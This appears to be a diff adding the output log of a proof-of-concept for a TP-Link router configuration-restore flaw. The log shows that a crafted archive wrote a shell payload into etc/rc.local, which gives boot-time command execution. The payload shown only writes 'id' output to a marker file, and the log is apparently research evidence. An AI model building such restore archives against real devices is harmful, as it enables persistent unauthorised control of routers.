@@ -1,0 +1,5 @@
+archive=/tmp/tplink_be_restore_rc_local_chain_3718/restore_rc_local_poc.tgz
+root=/tmp/tplink_be_restore_rc_local_chain_3718/root
+wrote=/tmp/tplink_be_restore_rc_local_chain_3718/root/etc/rc.local
+payload=#!/bin/sh;id > /tmp/tplink_be_restore_rc_local_poc;
+d67245c373a074b9eff3b7647acfa1089971584810166810fab426f632edccdc  /tmp/tplink_be_restore_rc_local_chain_3718/restore_rc_local_poc.tgz
